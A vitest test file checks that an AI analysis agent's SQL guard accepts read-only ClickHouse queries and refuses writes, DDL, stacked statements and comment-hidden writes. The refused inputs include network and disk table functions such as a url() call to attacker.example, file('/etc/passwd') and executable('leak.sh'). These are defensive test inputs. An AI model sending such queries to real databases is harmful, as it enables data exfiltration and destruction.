import { describe, expect, it } from "vitest";
import {
  assertReadOnlyQuery,
  isReadOnlyQuery,
  ReadOnlyQueryError,
} from "~/agents/read-only-sql";

describe("assertReadOnlyQuery: what the analysis agent is allowed to send", () => {
  it("accepts the statement forms an analyst actually needs", () => {
    for (const sql of [
      "SELECT count() FROM corpscout.se_company_address FINAL WHERE is_current",
      "WITH pool AS (SELECT 1 AS x) SELECT * FROM pool",
      "DESCRIBE corpscout.se_addresses_current",
      "SHOW TABLES FROM corpscout",
      "EXPLAIN SELECT 1",
      "  select 1  ",
    ]) {
      expect(isReadOnlyQuery(sql), sql).toBe(true);
    }
  });

  it("returns the statement with a trailing semicolon trimmed", () => {
    expect(assertReadOnlyQuery("SELECT 1;  ")).toBe("SELECT 1");
  });

  it("refuses every write and DDL form", () => {
    for (const sql of [
      "INSERT INTO corpscout.se_company_address VALUES (1)",
      "ALTER TABLE corpscout.se_company_address DELETE WHERE 1",
      "CREATE TABLE t (x UInt8) ENGINE = Memory",
      "DROP TABLE corpscout.se_company_address",
      "TRUNCATE TABLE corpscout.se_company_address",
      "OPTIMIZE TABLE corpscout.se_company_address FINAL",
      "SYSTEM RELOAD CONFIG",
      "KILL QUERY WHERE 1",
      "SET max_threads = 1",
    ]) {
      expect(isReadOnlyQuery(sql), sql).toBe(false);
    }
  });

  it("refuses a write hidden behind a comment or a second statement", () => {
    expect(() => assertReadOnlyQuery("-- just looking\nINSERT INTO t VALUES (1)")).toThrow(
      ReadOnlyQueryError,
    );
    expect(() => assertReadOnlyQuery("/* c */ DROP TABLE t")).toThrow(ReadOnlyQueryError);
    expect(() => assertReadOnlyQuery("SELECT 1; DROP TABLE t")).toThrow(
      /one statement/i,
    );
  });

  it("refuses the read-only table functions that still reach the network or disk", () => {
    // readonly=1 permits all of these server-side -- they are reads. They are
    // also the exfiltration path, so the guard is the only thing stopping them.
    for (const sql of [
      "SELECT * FROM url('http://attacker.example/x', JSONEachRow)",
      "SELECT * FROM file('/etc/passwd', LineAsString)",
      "SELECT * FROM s3('https://bucket/x', 'CSV')",
      "SELECT * FROM remote('other:9000', system.one)",
      "SELECT * FROM mysql('h:3306', 'db', 't', 'u', 'p')",
      "SELECT * FROM executable('leak.sh', TabSeparated)",
    ]) {
      expect(isReadOnlyQuery(sql), sql).toBe(false);
    }
  });

  it("does not refuse an innocent query because a keyword appears in a literal", () => {
    // Literals are stripped before keyword matching: a LIKE pattern or a city
    // name must not read as a write.
    expect(
      isReadOnlyQuery(
        "SELECT count() FROM corpscout.se_company_address WHERE street_address LIKE '%insert%'",
      ),
    ).toBe(true);
    expect(
      isReadOnlyQuery("SELECT evidence_set_hash, deleted_at FROM corpscout.x"),
    ).toBe(true);
  });

  it("refuses an empty statement", () => {
    expect(() => assertReadOnlyQuery("   ")).toThrow(/empty/i);
  });
});
